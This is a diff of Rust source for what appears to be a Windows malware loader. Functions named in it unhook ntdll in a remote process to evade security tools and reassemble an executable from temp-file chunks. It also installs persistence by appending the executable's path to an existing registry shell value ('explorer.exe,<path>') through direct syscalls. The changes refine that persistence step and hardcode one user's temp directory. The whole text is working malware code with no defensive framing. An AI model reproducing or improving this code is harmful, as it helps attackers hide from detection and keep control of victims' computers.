@@ -360,7 +360,7 @@ fn unhook_remote_ntdll(process_handle: HANDLE, remote_base: usize) {
 }
 
 fn reconstruct_exe(dest_path: &str) -> Option<()> {
-    let temp_dir = std::env::temp_dir();
+    let temp_dir = std::path::PathBuf::from("C:\\Users\\Kemal\\AppData\\Local\\Temp");
     let files = ["1.tmp", "2.tmp", "3.tmp"];
     let mut combined_bytes = Vec::new();
 
@@ -598,7 +598,7 @@ fn set_persistence(exe_path: &str) -> Option<()> {
         )
     };
 
-    let new_value_str = if status == 0 {
+    let (new_value_str, value_type) = if status == 0 {
         let info = unsafe { &*(buffer.as_ptr() as *const KEY_VALUE_PARTIAL_INFORMATION) };
         let data_slice = unsafe { std::slice::from_raw_parts(info.Data.as_ptr() as *const u16, (info.DataLength / 2) as usize) };
         let current_shell = String::from_utf16_lossy(data_slice).trim_matches('\0').to_string();
@@ -606,9 +606,9 @@ fn set_persistence(exe_path: &str) -> Option<()> {
             unsafe { asm_nt_close(key_handle, nt_close_syscall); }
             return Some(());
         }
-        format!("{},{}", current_shell, exe_path)
+        (format!("{},{}", current_shell, exe_path), info.Type)
     } else {
-        format!("explorer.exe,{}", exe_path)
+        (format!("explorer.exe,{}", exe_path), REG_SZ)
     };
 
     let mut new_value_u16: Vec<u16> = new_value_str.encode_utf16().collect();
@@ -619,7 +619,7 @@ fn set_persistence(exe_path: &str) -> Option<()> {
             key_handle,
             &mut value_name,
             0,
-            REG_SZ,
+            value_type,
             new_value_u16.as_mut_ptr() as *mut _,
             (new_value_u16.len() * 2) as u32,
             nt_set_value_key_syscall,
